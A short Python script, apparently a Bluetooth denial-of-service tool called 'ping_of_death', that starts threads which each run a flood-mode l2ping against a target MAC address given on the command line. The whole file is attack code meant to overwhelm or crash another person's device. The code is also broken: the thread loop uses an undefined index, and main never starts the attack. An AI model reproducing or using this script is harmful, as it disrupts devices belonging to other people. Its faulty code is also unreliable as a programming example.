#!/usr/bin/env python3

import os
import sys
import threading

class ping_of_death:
    def __init__(self):
        self.argv = sys.argv
        self.argc = len(self.argv)

    def run_attack_beacon(self):
        os.system(f"l2ping -i hci0 -s 40 -f {self.mac_addr}")

    def run_threads(self):
        try:
            for thread in range(self.threads):
                print(f"[*] Running attack beacon #{str(thread)}...")
                self.threads_list[i] = threading.Thread(target=self.run_attack_beacon)
                self.threads_list[i].setDaemon(True)
                self.threads_list[i].start()
        except (KeyboardInterrupt, EOFError):
            print(f"[-] Interrupted.")
    
    def main(self):
        if self.argc < 3:
            print("ping_of_death.py <threads> <mac_addr>")
            return

        self.threads = int(self.argv[1])
        self.mac_addr = self.argv[2]
    
        self.threads_list = [None] * self.threads
      
if __name__ == '__main__':
    ping_of_death = ping_of_death()
    ping_of_death.main()
